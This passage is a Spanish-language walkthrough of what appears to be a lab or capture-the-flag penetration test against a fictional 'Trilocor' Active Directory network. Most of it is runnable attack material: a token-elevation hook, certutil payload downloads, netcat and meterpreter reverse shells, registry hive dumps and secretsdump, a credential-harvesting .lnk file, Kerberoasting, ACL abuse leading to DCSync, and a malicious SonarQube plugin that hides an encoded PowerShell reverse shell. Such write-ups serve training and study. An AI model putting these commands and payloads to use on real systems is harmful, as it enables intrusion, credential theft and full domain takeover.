SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(LPWSTR pszPrincipal, LPWSTR pszPackage, unsigned long fCredentialUse, void* pvLogonId, void* pAuthData, SEC_GET_KEY_FN pGetKeyFn, void* pvGetKeyArgument, PCredHandle phCredential, PTimeStamp ptsExpiry)
{
    LUID logonId;
    ZeroMemory(&logonId, sizeof(LUID));
    logonId.LowPart = 0x3E7; // here we do the Tcb magic using the SYSTEM LUID in pvLogonId of AcquireCredentialsHandleW call
    return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse, &logonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);
}
```

Para la compilacion del mismo, se uso el siguiente comando:

```bash
x86_64-w64-mingw32-g++ -o TcbElevation.exe TcbElevation.cpp -static -ladvapi32 -lsecur32 -lkernel32 -DUNICODE -D_UNICODE -municode
```

Luego, lo descargamos en la maquina.

```powershell
PS C:\PROGRAMDATA> certutil -urlcache -split -f http://172.16.139.10:8080/TcbElevation.exe C:\programdata\TcbElevation.exe
```

Y nos ponemos en escucha desde `DMZ01`.

```bash
nc -nvlp 9001
```

Y ya con se pudo crear un servicio que ejecute el `nc.exe` enviando una shell.

```powershell
PS C:\ProgramData> .\TcbElevation.exe test "C:\programdata\nc64.exe 172.16.139.10 9001 -e cmd"
```

![](/images/name/imagen-Q75O0Pu4.png){width="auto"}

Y desde la otra consola recibimos la shell como `nt authority\system`

![](/images/name/imagen-u9aGSK0A.png){width="auto"}

![](/images/name/imagen-FPZ2SlWR.png){width="auto"}
Descripcion: Flag `5`.

Debido a que la shell por alguna razon muere, creamos otro proceso con un nombre distinto, y volvemos a enviar una nueva, esta vez agregando al usuario `svc_liferay` al grupo `Administrators`.

```powershell
C:\Windows\system32>net localgroup administrators svc_liferay /add
```

![](/images/name/imagen-moZxVkny.png){width="auto"}

Con esto hecho, volvemos a la web de `Liferay` y enviamos una nueva shell para este usuario, y confirmamos la membresia de este grupo.

```powershell
net user svc_liferay
```

![](/images/name/imagen-vlt1QcVP.png){width="auto"}

Luego de confirmar esto, para poder descargar y subir archivos, se creo un payload con `msfvenom` el cual se encarga de el envio de un meterpreter a `DMZ01`, host desde el cual vamos a crear un `Remote Port Forwarding` para que lo que llegue a ese host, se rediriga a nuestro meterpreter que configuramos por el puerto `7000`.

El payload se creo de la siguiente forma.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.139.10 LPORT=443 -f exe -o reverse.exe
```

El cual dicho binario fue descargado en `SRV01`.

```powershell
PS C:\PROGRAMDATA> certutil -urlcache -split -f http://172.16.139.10:8080/reverse.exe C:\programdata\reverse.exe
```

Y luego desde la consola de ssh en `DMZ01` nos guardamos el contenido de la clave privada de `root`.

```bash
root@WEB-DMZ01:~# cat /root/.ssh/id_rsa
```

![](/images/name/imagen-4wiEzDQD.png){width="auto"}

Y desde una consola propia, nos conectamos a `DMZ01` haciendo un `Remote Port Forwarding` del puerto 443 de la siguiente forma.

```bash
ssh root@trilocor.local -i id_rsa_rootDMZ -R 172.16.139.10:4444:0.0.0.0:7000
```

De manera que todo lo que llegue a `DMZ01` por el puerto `443` sea reenviado al puerto `7000` de nuestro localhost.

Configuramos nuestro `meterpreter`.

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 7000 
run
```

![](/images/name/imagen-iev2x4Bx.png){width="auto"}

Y luego ejecutamos el payload desde `SRV01`. Y recibimos nuestro meterpreter.

![](/images/name/imagen-LUa6rhwL.png){width="auto"}

Luego desde esta consola guardamos una copia de los registros `SAM, SYSTEM y SECURITY`.

```powershell
reg save HKLM\SYSTEM system.bak
reg save HKLM\SAM sam.bak
reg save HKLM\SECURITY security.bak
```

![](/images/name/imagen-VfiFCElm.png){width="auto"}

De manera que desde la session de meterpreter, podemos descargarlos a nuestra maquina con `download`.


![](/images/name/imagen-eIbdatfl.png){width="auto"}

Despues se uso `secretsdump` de impacket para hacer un dumpeo de estos registros.

```bash
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
```

![](/images/name/imagen-zuBbgdbB.png){width="auto"}

Con la informacion de este dumpeo, se obtuvieron el hash del usuario `administrator` y la password del usuario `svc_liferay`.
Por lo que se realizo la conexion al servicio de WinRM como el usuario `Administrator`.

```powershell
evil-winrm -i 172.16.139.35 -u administrator -H 9cc7e0d2bcd1b87a2823ec664a661113
```

![](/images/name/imagen-shYFuHqV.png){width="auto"}

Luego de una enumeracion, se hallo un archivo de session de `Sublime Text 3`, en el directorio `C:\users\rhinkle\appdata\roaming\Sublime text 3\local`.

```powershell
gci -force
```

![](/images/name/imagen-NF0h3xuZ.png){width="auto"}

En el contenido del mismo, se revelo un host con el cual solo `SRV01` tiene conectividad, junto con credenciales para el usuario `devuser_1`.

![](/images/name/imagen-IzlTw2Xx.png){width="auto"}

Como es un nuevo host, se realizo un escaneo `nmap` para ver que puertos estaban abiertos en dicho sistema, descubriendo asi, el puerto `5985 (WinRM)` y el puerto `3389 (RDP)`.

```bash
nmap -T4 -n 172.16.139.175 -sS -v
```

![](/images/name/imagen-BAYJKmTP.png){width="auto"}

Con las credenciales encontradas se realizo la conexion via `RDP`.

```bash
xfreerdp3 /v:172.16.139.175 /u:devuser_1 /p:'Changemeplz123!"' /cert:ignore /tls:seclevel:0
```

![](/images/name/imagen-peVmLitG.png){width="auto"}

![](/images/name/imagen-zsj0GzHO.png){width="auto"}
Descripcion: Flag `6`.

Dentro de este sistema se identifico una version vulnerable de `Remote Mouse` con el siguiente comando de `Powershell`.

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation; $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation; $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

![](/images/name/imagen-wwT8fzJ7.png){width="auto"}

Para la version `3.008` de este Software, se encontro [este exploit](https://www.exploit-db.com/exploits/50047) publico, el cual permite a un usuario de bajos privilegios `(devuser_1)`, spawnear una `cmd` como `system`. 

Como se indica en el mismo hay distintos pasos
1. Ir a la barra de tareas.
2. Abrir `Remote Mouse`.
3. Seleccionar la pestaña `Settings`.
4. Clickear en `Change`.
5. Colocar la ruta nativa de `cmd.exe` en el buscador
6. Y darle a `Save`

De manera que asi se logra abrir un proceso de `cmd.exe` como el usuario `nt authority\system`.

![](/images/name/imagen-QpY7PMlo.png){width="auto"}

![](/images/name/imagen-dW9UViOj.png){width="auto"}
Descripcion: Evidencia del proceso iniciado de `cmd.exe` como `system`.

![](/images/name/imagen-ye9NLheD.png){width="auto"}
Descripcion: Flag `7`.

Luego como `system`, se enumero el dominio con `Sharphound.exe`

```powershell
.\SharpHound.exe -c all
```

![](/images/name/imagen-sm5GMmHB.png){width="auto"}

Y luego se uso `laZagne.exe` para buscar credenciales almacenadas en todo el sistema, encontrando asi, credenciales para el usuario `bvincent`.

```powershell
.\laZagne.exe all
```

![](/images/name/imagen-v0uzl50p.png){width="auto"}

Las mismas fueron validadas en el host `DC01`.

```bash
nxc smb 172.16.139.3 -u 'bvincent' -p='-PL<mko09ijn!'
```

![](/images/name/imagen-Ur4OKqMP.png){width="auto"}

Luego se identifico que el mismo tenia capacidad de escritura en un recurso compartido del protocolo `SMB`.

```bash
nxc smb 172.16.139.3 -u 'bvincent' -p='-PL<mko09ijn!' --shares
```

![](/images/name/imagen-czkJY69Y.png){width="auto"}

De manera que se realizo la conexion a dicho protocolo y se coloco dentro, un archivo `.lnk` con el siguiente contenido.

```bash
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\\Malicious.lnk")
$lnk.TargetPath = "\\\\172.16.139.35\\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\\system32\\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

![](/images/name/imagen-XRnwpGTJ.png){width="auto"}

Para que cualquiero usuario que este constantemente revisando esa carpeta, dispare una autenticacion contra `SRV01`, host desde el cual iniciamos `Inveigh.exe` como envenenador, para recibir hashes `NTLMv2`, similar a `Responder`.
De manera que despues de varios intentos, se intercepta el hash del usuario `phernandez`.

![](/images/name/imagen-0k8J9hnl.png){width="auto"}

Se coloco el mismo dentro de un archivo y se crackeo con `hashcat`.

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

![](/images/name/imagen-8m4hyKzN.png){width="auto"}

Luego con las credenciales del mismo, se analizo la data en `Bloodhound` y se descubrio que este usuario era miembro del grupo `Help Desk Tier III`, grupo que poseia el permiso `AllExtendedRights` sobre el usuario `ghiggins`.

![](/images/name/imagen-6XGrzN7I.png){width="auto"}

Por lo que con el uso de las credenciales del usuario `phernandez` se le cambio la password a `ghiggins` con `bloodyAD`.

```bash
bloodyAD -d ad.trilocor.local -u phernandez -p 'bLink182' --dc-ip 172.16.139.3 set password ghiggins 'Lalahola23!$'
```

![](/images/name/imagen-zMquFtIr.png){width="auto"}

Ademas se identifico la membresia de `ghiggins` en el grupo `IT Support Managers`, el cual poseia el permiso `GenericWrite` sobre el grupo `Contractors`

![](/images/name/imagen-2Afy3OV6.png){width="auto"}

Por lo que este permiso le da la capacidad al usuario `ghiggins` de añadirse al grupo `Contractors`. Ademas `Contractors` poseia el privilegio `GenericWrite` pero esta vez sobre el usuario `divanov`.
Por lo que primero se necesito agregar a `ghiggins` a este grupo, para realizar dicha accion se volvio a usar la misma herramienta.

```bash
bloodyAD -d ad.trilocor.local -u ghiggins -p 'Lalahola23!$' --dc-ip 172.16.139.3 add groupMember 'Contractors' ghiggins
```

![](/images/name/imagen-7zodVhs5.png){width="auto"}

Luego para abusar del privilegios de `Contractors` sobre `divanov`, usamos `RunasCs.exe` para crear un proceso de `cmd.exe` para obtener unas shell como `ghiggins` y asi poder realizar un `Targeted Kerberoast` sobre `divanov`, permitiendonos asi obtener un `hash`.

Primero necesitamos subir el binario a `SRV01` desde el meterpreter.

```bash
meterpreter > upload RunasCs.exe
```

![](/images/name/imagen-mHByOdCK.png){width="auto"}

Despues desde la consola de evil-winrm como el usuario `administrator`, podemos usarlo con las credenciales que se setearon para el usuario `ghiggins` y  ejecutar el mismo `payload` para que envie un meterpreter como dicho usuario.

```powershell
PS C:\programdata> .\RunasCs.exe ghiggins 'Lalahola23!$' "cmd.exe /c C:\programdata\reverse.exe"
```

Y desde nuestro meterpreter recibimos la sesion.

![](/images/name/imagen-Yx2PLRB3.png){width="auto"}

Ahora para poder abusar del privilegio, necesitamos asigarle un `SPN (Service Principal Name)` al usuario `divanov`. Para eso subimos `PowerView.ps1`, el cual puede descargarse en el sistema desde [este repositorio](https://github.com/PowerShellMafia/PowerSploit).

Una vez en el sistema, tenemos que importar sus modulos.

```powershell
. .\PowerView.ps1
```

Y luego se le asigna un `SPN` al usuario `divanov`.

```powershell
Set-DomainObject -Identity divanov -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```

![](/images/name/imagen-tCnBbtzx.png){width="auto"}

Y luego se realiza un `Kerberoasting` contra el mismo.

```powershell
$User = Get-DomainUser divanov
$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
```

![](/images/name/imagen-C7J8X8In.png){width="auto"}

Dicho hash se guarda en un archivo para luego romperlo con `john`.

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

![](/images/name/imagen-pugoC1kV.png){width="auto"}

Luego se identifico que este usuario tiene la capacidad de añadirse al grupo `MSSP Connect` ya que posee el privilegio `AddSelf`, y a su vez dicho grupo cuenta con el privilegio `WriteOwner`, sobre el grupo `Tier Infrastructure I`, lo que le da la capacidad de hacerse propietario del mismo y en consecuencia obtener un membresia al añadirse a dicho grupo.

![](/images/name/imagen-xFGFMMKt.png){width="auto"}

![](/images/name/imagen-6ylIKztq.png){width="auto"}
Primero se agrego al usuario `divanov` al grupo `MSSP Connect` con `bloodyAD`.

```bash
 bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 add groupMember 'MSSP CONNECT' divanov
```

![](/images/name/imagen-ee67ssE6.png){width="auto"}

Ahora que este usuario es miembro, se le hizo `owner` de `Tier I Infrastructure`.

```bash
bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 set owner 'TIER I INFRASTRUCTURE' divanov
```

![](/images/name/imagen-Vvx7aFVa.png){width="auto"}

Una vez hecho esto, uso nuevamente sus credenciales para modificar la `DACL` de este usuario sobre el grupo, para asi poder tener la capacidad de agregar miembros a dicho grupo.

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'divanov' -target-dn 'CN=TIER I INFRASTRUCTURE,OU=SECURITY GROUPS,OU=CORP,DC=AD,DC=TRILOCOR,DC=LOCAL' 'ad.trilocor.local'/'divanov':'Dimitris2001' -dc-ip 172.16.139.3
```

![](/images/name/imagen-95OgujX7.png){width="auto"}

Ahora si con este atributo modificado se obtuvo la capacidad de agregar al usuario `divanov` a este grupo.

```bash
bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 add groupMember 'TIER I INFRASTRUCTURE' divanov
```

![](/images/name/imagen-ncXVKHqD.png){width="auto"}

Esto le otorgo a `divanov` la capacidad de poder ver usuarios y objetos eliminados del dominio con `ldapsearch`, lo que nos revelo al usuario `fjenkins_test` juntos con su password.

```bash
ldapsearch -x -H ldap://172.16.139.3 \                                                                                         
  -D "divanov@ad.trilocor.local" \
  -w "Dimitris2001" \
  -b "DC=ad,DC=trilocor,DC=local" \
  "(&(isDeleted=TRUE)(objectClass=user))" \
  "*" -E "1.2.840.113556.1.4.417" -c
```


![](/images/name/imagen-1dCeIVKg.png){width="auto"}
Descripcion: Usuario eliminado: `fjenkins : fJ#nk!n$$@123`

Con dicho password, se subio la version de [Windows](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) de `Kerbrute` para realizar un `Password Spray` sobre `DC01`, dandonos como resultado, una coincidencia con el usuario `fjenkins_adm`.

```powershell
.\kerbrute.exe passwordspray -d ad.trilocor.local --dc 172.16.139.3 valid_users 'fJ#nk!n$$@123'
```

![](/images/name/imagen-410mYE0B.png){width="auto"}

Dicho usuario posee el privilegio `GenericWrite` sobre 3 grupos.

![](/images/name/imagen-HDtlq2ML.png){width="auto"}

Por lo que con sus credenciales se agrego al mismo a cada uno de estos.

```bash
bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'DESKTOP ADMINS' fjenkins_adm
bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'HELP DESK' fjenkins_adm
bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'DESKTOP ADMINS' fjenkins_adm
```

![](/images/name/imagen-nDV5oO6N.png){width="auto"}

Ademas se descurbrio que tenia permisos tanto de escritura como de lectura, en el recuso compartido `Department Shares`.

```bash
nxc smb 172.16.139.3 -u fjenkins_adm -p 'fJ#nk!n$$@123' --shares
```

![](/images/name/imagen-EQigZDQA.png){width="auto"}

Se realizo la conexion a este recurso de `SMB` son sus credenciales.

```bash
smbclient '\\172.16.139.3\Department Shares' -U fjenkins_adm
```

Y es asi como en la ruta `/IT/Private/IT_BACKUP02072022/` se encontro un archivo en formato `AxCrypt`.

![](/images/name/imagen-Pv1W7wAR.png){width="auto"}

Se descargo en el equipo y con `axcrypt2john` se extrajo del mismo en un hash, el cual se rompio con `john`.

```bash
axcrypt2john Trilocor_backup_03072022-zip.axx > hash_backup.txt
```

```bash
john hash_backup.txt -w=/usr/share/wordlists/rockyou.txt
```

![](/images/name/imagen-uyJ6jcFe.png){width="auto"}

Con dicha password pudimos dejar el archivo en un comprimido `.zip` con AxCrypt, la cual puede ser descargada en una maquina Windows [desde este enlace](https://www.axantum.com/download), al abrirla hacemos click en `Descifrar/Decrypt`

![](/images/name/imagen-Bl3RRSg7.png){width="auto"}

Y luego colocamos el archivo `.axx`.

![](/images/name/imagen-hHdN3Iju.png){width="auto"}

Al volver a tocar en Descifrar/Decrypt, nos solicita la password que lo protege, dejandonos con el `.zip` original.

![](/images/name/imagen-lAQEnqjm.png){width="auto"}

Luego de pasarlo a una maquina local, lo descomprimimos.

```bash
7z x Trilocor_backup_03072022.zip
```

Dejandonos la carpeta `Private` y la `Public`, dentro de Private se hallo la carpeta `Management Credentials` con un archivo en formato `OneNote`.

![](/images/name/imagen-xAVHaU2O.png){width="auto"}

El archivo estaba protegido con una clave maestra, asi que se utilizo `office2john` para extraer un hash de este archivo y luego romperlo con `john`

```bash
office2john Creds.one > office_hash.txt 
john office_hash.txt -w=/usr/share/wordlists/rockyou.txt
```

![](/images/name/imagen-P6fqwjUH.png){width="auto"}

Una vez se obtuvo la clave, en una maquina Windows, se abrio `Microsoft OneNote`, y se abrio el archivo con la misma, desbloqueando el mismo y revelando `3` credenciales.

![](/images/name/imagen-yugomuHb.png){width="auto"}

Con las cuales se realizo un Password Spraying con cada una, siendo valida solamente la del usuario `svc_trilocoradm`.

```powershell
PS C:\programdata> .\kerbrute.exe passwordspray -d ad.trilocor.local --dc 172.16.139.3 valid_users 'SvC_TR!l0cORAdm!23'
```

![](/images/name/imagen-DKv96efx.png){width="auto"}

Dicho usuario por ser parte del grupo `Remote Management Users` tiene la capacidad de conectarse con `evil-winrm`.

![](/images/name/imagen-JL4k9HV2.png){width="auto"}

```powershell
evil-winrm -i 172.16.139.3 -u svc_trilocoradm -p 'SvC_TR!l0cORAdm!23'
```

![](/images/name/imagen-22jbmAqp.png){width="auto"}
Descripcion: Flag `8`.

Con el analisis de `bloodhound` se descubrio que el usuario `svc_trilocoradm` era parte del grupo `Account Operators`, grupo el cual posee el privilegio `GenericAll` sobre `Exchange Trusted Subsystem`, que cual tiene la capacidad de modificar la ACL sobre `USERS`para asi llevar a cabo un `DCSync Attack`

![](/images/name/imagen-5aM9uISs.png){width="auto"}

Para llevar a cabo este ataque, primero se agrego a este usuario al grupo `Exchange Trusted Subsystem`

```bash
bloodyAD -d ad.trilocor.local -u svc_trilocoradm -p 'SvC_TR!l0cORAdm!23' --dc-ip 172.16.139.3 add groupMember 'EXCHANGE TRUSTED SUBSYSTEM' svc_trilocoradm
```

![](/images/name/imagen-qeGF860p.png){width="auto"}

Lo que luego permitio modificar los atributos del mismo sobre `USERS` dandose asi permisos `Full Control`.

```bash
 impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'svc_trilocoradm' -target-dn 'CN=USERS,DC=AD,DC=TRILOCOR,DC=LOCAL' 'ad.trilocor.local'/'svc_trilocoradm':'SvC_TR!l0cORAdm!23' -dc-ip 172.16.139.3 
```

![](/images/name/imagen-OlAEp5fH.png){width="auto"}

Una vez se realiza esta accion, se le otorgaron los permisos de poder realizar un `DCSync Attack` al usuario `svc_trilocoradm`.

```bash
bloodyAD -d ad.trilocor.local -u svc_trilocoradm -p 'SvC_TR!l0cORAdm!23' --dc-ip 172.16.139.3 add dcsync svc_trilocoradm
```

![](/images/name/imagen-M48vnGKp.png){width="auto"}

Lo que le da la capacidad de realizar un dumpeo de todos los hashes del `Domain Controller (DC)` con `impacket-secretsdump`, obteniendo asi el hash del usuario `Administrator`.

```bash
impacket-secretsdump ad.trilocor.local/svc_trilocoradm:'SvC_TR!l0cORAdm!23'@172.16.139.3
```

![](/images/name/imagen-Z0cYehY7.png){width="auto"}

Donde con dicho hash se realizo la conexion a `WinRM`.

```bash
evil-winrm -i 172.16.139.3 -u administrator -H e7d499a2cd11b1ba3875a60812e21894
```


![](/images/name/imagen-tM6B8xrA.png){width="auto"}
Descripcion: Flag `9`. 

Luego desde este host `(DC01)`, se identifico una nueva interfaz de red con el segmento `172.16.210.0/24`, por lo que desde se subio el agente de `ligolo`

```powershell
upload agent.exe
```

Y luego desde la consola de ligolo se crea un redirector para lograr que la conexion se establezca en nuestra interfaz de `ligolo`.

```bash
[Agent : root@WEB-DMZ01] » listener_add --addr 172.16.139.10:8443 --to 127.0.0.1:443
```

Ahora si desde `DC01`, se ejecuta el agente, haciendo la conexion hacia `DMZ01`.

```bash
.\agent.exe -connect 172.16.139.10:8443 -ignore-cert
```

![](/images/name/imagen-uGOvDdZp.png){width="auto"}

Para crear un tunel con el que se pueda operar por el nuevo segmento, se agrega a nuestra maquina la misma, pero primero hay que parar el primer tunel de `DMZ01`.

```bash
stop
```

Luego se elije la session de `DC01`.

```BASH
session
```

Y ahora si 

```bash
sudo ip route add 172.16.210.0/24 dev ligolo
```

Luego se hace un escaneo `nmap` para identificar los hosts que estan activos en este nuevo segmento de red, juntos con los puertos abiertos que hay en cada uno de ellos.

```bash
nmap -v -n 172.16.210.0/24 -T4 –-unprivileged
```

![](/images/name/imagen-n2t6VdiU.png){width="auto"}

Es asi como se ve que desde `DC01`, tenemos conectividad a la `172.16.210.5 (DC02)`, por lo que desde una nueva consola de `evil-winrm`, se identifico un Cross-Forest con dicho dominio (`mgmt.trilocorvendor.local`).

```powershell
Get-DomainTrust
```

![](/images/name/imagen-IotgivgV.png){width="auto"}

Por lo que se enumero cuentas de dicho dominio con un SPN asignado, viendo asi al usuario `mvargas_adm`.

```powershell
Get-DomainUser -SPN -Domain mgmt.trilocorvendor.local | select SamAccountName
```

![](/images/name/imagen-3tC4QObA.png){width="auto"}


Asi que para realizar un `Kerberoasting`, usamso `Rubeus.exe`.

```powershell
.\Rubeus.exe kerberoast /domain:mgmt.trilocorvendor.local /user:mvargas_adm /nowrap
```

![](/images/name/imagen-sR1USd2A.png){width="auto"}

Dicho hash obtenido lo colocamos dentro de un archivo y se rompio con `john`, obteniendo asi su password en texto plano .

```bash
hashcat -m 13100 hash_vargas /usr/share/wordlists/rockyou.txt
```


![](/images/name/imagen-O9MZ7KuZ.png){width="auto"}


Con dichas credenciales se recolectaron los datos, con `rusthound-ce`.

```bash
rusthound-ce -d mgmt.trilocorvendor.local -u 'mvargas_adm' -p 'admin!@#' -i 172.16.210.5
```

Viendo asi que este usuario tenia la capacidad de leer la `gmsaPassword` del usuario computadora `svc_triconnect$`.

![](/images/name/imagen-PFrGNb4i.png){width="auto"}

Para poder abusar del permiso que tiene sobre la computadora usamos `gmsaDumper`, obteniendo asi el hash `NT` de este usuario.

```bash
python3 gMSADumper.py -u 'mvargas_adm' -p 'admin!@#' -d 'mgmt.trilocorvendor.local' --ldapserver 172.16.210.5
```

![](/images/name/imagen-aDjuiXe0.png){width="auto"}

Con el mismo se hizo la conexion a `evil-winrm`.

```powershell
evil-winrm -i 172.16.210.5 -u svc_triconnect$ -H '70134056c69b93c1297b0d6c452899b1'
```

![](/images/name/imagen-ZGcWRy2i.png){width="auto"}
Description: Flag `10`.

Dicho usuario es parte del grupo `Server Operators`, lo que le da la capaciadad de editar, parar y iniciar servicis, entre otras muchas funciones.

![](/images/name/imagen-HB9hCJX1.png){width="auto"}

Por lo que se modifico `VSS`, con un comando el cual agrege al usuario `svc_triconnect$` al grupo `Administrators`.

```powershell
sc.exe config VSS binpath="cmd /c net localgroup Administrators svc_triconnect$ /add"
```

![](/images/name/imagen-RAxcAMD5.png){width="auto"}

Y luego se paro el servicio, para nuevamente arrancarlo, haciendo que dicho comando se ejecute con exito.

```powershell
sc.exe stop VSS
sc.exe start VSS
```

![](/images/name/imagen-Pl2u4DXp.png){width="auto"}

Para que la membresia se aplique correctamente, se cierra la sesion y se vuelve a conectar con `evil-winrm`.

![](/images/name/imagen-bq5CO6PV.png){width="auto"}
Description: Flag `11`.

En el directorio `C:\Users\administrator\documents` vimos un baul, con hashes de `Ansible`

![](/images/name/imagen-61ECyaSI.png){width="auto"}

Los mismos se guardan localmente en un archivo sacando los espacios, lo que quedaria asi:

![](/images/name/imagen-SaUA9Dum.png){width="auto"}

Luego con `ansible2john` se crean hashes con los mismos.

```bash
ansible2john username.vault password.vault | tee hashes.vault
```

![](/images/name/imagen-5Q4bOCua.png){width="auto"}

Los mismos se rompen con `john` revelando asi la clave que protege el `vault.yml`.

```bash
john hashes.vault -w=/usr/share/wordlists/rockyou.txt 
```

![](/images/name/imagen-aQbSVm4e.png){width="auto"}

Con dichas claves, usamos `ansible-vault` con la opcion `decrypt` para poder desencriptar cada uno de los archivos, revelando al usuario `svc_ansible` junto con su password.

```bash
ansible-vault decrypt username.vault
```

![](/images/name/imagen-TUNdC2xL.png){width="auto"}

```bash
ansible-vault decrypt password.vault
```

![](/images/name/imagen-cUPNka4J.png){width="auto"}

Dichas credenciales fueron usadas en el puerto `8081` de la maquina `172.16.210.21` el cual corresponde host `DEV01`.

![](/images/name/imagen-syqwsAZi.png){width="auto"}

En dicho puerto corre el servicio de `SonaType Nexus`, donde se uso la password `automate86` con el usuario `admin`.

![](/images/name/imagen-tzn0Daf1.png){width="auto"}

Si clickeamos en la `Tuerca` y nos vamos a la seccion de `Tasks`, vemos que podemos crear tareas automatizadas, las cuales ejecutan codigo `Groovy`, por lo que usando una `Reverse Shell` de [revshells.com](https://www.revshells.com/), que envie una consola a `DC01`, la misma la colocamos la misma en en el campo.

![](/images/name/imagen-HiBCoLDN.png){width="auto"}


Y desde `DC01` preparamos el listener.

```powershell
nc64.exe -nlvp 4444
```

Y le damos a `Run` en la pagina, y vemos como llega una consola como el usuario `svc_nexus`.


![](/images/name/imagen-b4OXIQBj.png){width="auto"}

![](/images/name/imagen-oTAch0TV.png){width="auto"}
Description: Flag `12`.

Enumerando este sistema, vemos que en la ruta `C:\Sonarqube\sonarqube-7.8\conf` hay un archivo de `SonaQube` con credenciales para su pagina.

![](/images/name/imagen-LPGfaaNL.png){width="auto"}

Como es una version vulnerable `(7.8)`, se uso el [siguiente PoC](https://github.com/braindead-sec/pwnrqube), en el cual se muestra, como se puede compilar un plugin `.jar` malicioso que envie una shell a `DC01` en este caso.

Para este caso hay que modificar el archivo `benign.java`, que en se modifico de la siguiente manera para que envie una shell a `DC01`, desde donde va a estar el listener `nc` configurado.

```java
import org.sonar.api.Plugin;
import java.io.*;

public class benign implements Plugin {
    @Override
    public void define(Context context) {
        // Usamos un hilo separado para que SonarQube no se cuelgue al cargar el plugin
        new Thread(() -> {
            try {
                String lhost = "172.16.210.3"; 
                int lport = 4444;
                // Payload en Base64 para evitar problemas de comillas y caracteres especiales
                String powershellPayload = "$c = New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$o = (iex $d 2>&1 | Out-String );$t = $o + 'PS ' + (pwd).Path + '> ';$x = ([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()";
                
                String encodedPayload = java.util.Base64.getEncoder().encodeToString(powershellPayload.getBytes("UTF-16LE"));
                ProcessBuilder pb = new ProcessBuilder("powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Enc", encodedPayload);
                pb.start();
            } catch (Exception e) {
                // Silencio para no levantar sospechas
            }
        }).start();
    }
}
```

Luego volviendo a la ruta inicial, se compila, dejando asi el archivo que tenemos que subir.

```bash
mvn clean package
```

![](/images/name/imagen-iD5CrkxC.png){width="auto"}

Para subirlo se uso `curl`, usando las mismas credenciales, pero primero, se activa un listener en `DC01`.

```bash
nc64.exe -nlvp 4444
```

Y ahora con `curl` subimos el archivo.

```bash
curl --user admin:S0n@RQuB3_R3p0 -X POST -F "file=@target/totally-benign-plugin-1.0.jar" http://172.16.210.21:9000/api/updatecenter/upload
```

Y luego para que el mismo se instale, hay que reiniciar el servicio.

```bash
curl --user admin:S0n@RQuB3_R3p0 -X POST http://172.16.210.21:9000/api/system/restart 
```

Y desde nuestro listener se recibe la conexion.

![](/images/name/imagen-0GGu4ANa.png){width="auto"}

![](/images/name/imagen-z6wiyEDR.png){width="auto"}
Description: Flag `13`.

En esta shell, se uso `mimikatz`, para obtener los hashes de todos los usuarios, entre ellos, el usuario `svc_anuko`.

```bash
.\mimikatz.exe "sekurlsa:logonPasswords" exit
```

![](/images/name/imagen-IzxLMnrr.png){width="auto"}

Aprovenchando la shell como `system`, se agrego a este usuario al grupo `Administrators`, para luego poder dumpear los secretos `LSA`.

```bash
net localgroup administrators svc_anuko /add
```
![](/images/name/imagen-ORsqXTTJ.png){width="auto"}

```powershell
evil-winrm -i 172.16.210.21 -u svc_anuko -H '558cade6fd29570d763b23a6241f9572'
```

Y luego se guardo una copia de los registros para poder dumpearlos con `impacket-secretsdump`.

```powershell
reg save HKLM\SAM samdev01.hive
reg save HKLM\SYSTEM systemdev01.hive
reg save HKLM\SECURITY securitydev01.hive
```

![](/images/name/imagen-lxOob28g.png){width="auto"}

Para dumpear el contenido se uso el siguiente comando, usando el procesado local.

```bash
impacket-secretsdump -sam samdev01.hive -system systemdev01.hive -security securitydev01.hive LOCAL
```

![](/images/name/imagen-RkEIo1Uv.png){width="auto"}

Una vez tenemos esto, las credenciales de `svc_anuko` se utilizaron, en la web que corre por el puerto `80` en  `172.16.210.34`, donde corre el servicio de `Anuko Time Tracker` como se vio en el escaneo de `nmap`

![](/images/name/imagen-56bwjpwn.png){width="auto"}

En este caso las credenciales aplicaban para el usuario `admin`.

![](/images/name/imagen-Rb1MUoH3.png){width="auto"}

